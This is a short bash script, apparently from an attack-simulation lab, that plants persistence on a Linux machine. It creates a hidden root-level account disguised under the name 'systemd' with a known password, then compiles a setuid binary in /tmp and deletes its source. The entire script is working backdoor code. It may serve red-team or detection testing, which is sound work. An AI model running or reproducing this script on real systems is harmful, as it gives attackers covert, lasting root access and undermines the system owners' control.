#!/bin/bash

#Create root user
useradd -ou 0 -g 0 systemd
chpasswd <<<"systemd:systemd"

#suid binary
cd /tmp
cp /vagrant/attack/persistence/binarysuid /tmp/suid.c
gcc suid.c -o suid
chmod 7111 suid
rm suid.c